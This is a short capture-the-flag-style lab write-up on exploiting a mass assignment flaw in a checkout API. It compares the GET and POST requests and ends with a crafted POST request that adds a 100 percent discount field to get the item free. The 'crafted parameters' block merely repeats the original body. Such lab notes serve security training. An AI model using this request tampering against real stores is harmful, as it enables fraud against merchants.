# Exploiting a mass assignment vulnerability

Topic : Exploiting a mass assignment vulnerability

Concept: There are sometimes some parameters which are default set to most variables. Such as there might be a parameter like `isAdmin` which might be false set to most of the variables, if a patch or put requests let us update this variable then we can gain admin privilege. For this we have to know how to find these vulnerability.

End Goal : Exploiting a mass assignment vulnerability to buy a **Lightweight l33t Leather Jacket.**

Analysis :

- Reconned the whole app for the api usage and found the request where the api was called.
- The found request → same URL but different METHOD
- First request :

  ```
  GET /api/checkout HTTP/2
  ```

  - Response

  ```json
  {
    "chosen_discount": { "percentage": 0 },
    "chosen_products": [
      {
        "product_id": "1",
        "name": "Lightweight \"l33t\" Leather Jacket",
        "quantity": 1,
        "item_price": 133700
      }
    ]
  }
  ```

- 2nd Request

```json
{
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

- Response
  ```json
  HTTP/2 201 Created
  ```
- Let’s check options for this request
- Here we can compare the variables from the get request with the post request
- We see that a lot of variables are not given in the post request. Let us fudge them and send along with the post request. If it takes it input then, it works.

Total parameters :

```json
{
  "chosen_discount": { "percentage": 0 },
  "chosen_products": [
    {
      "product_id": "1",
      "name": "Lightweight \"l33t\" Leather Jacket",
      "quantity": 1,
      "item_price": 133700
    }
  ]
}
```

Crafted parameters :

```json
{
  "chosen_products": [{ "product_id": "1", "quantity": 1 }]
}
```

- The item price parameter was unfuzzable and did not have any effect. So, i looked at the discount percentage parameter and put that to 100 and it worked.
- Final request :

```json
POST /api/checkout HTTP/2

{
  "chosen_discount": { "percentage": 100 },
  "chosen_products": [{ "product_id": "1", "quantity": 3 }]
}

```

- This solves the lab
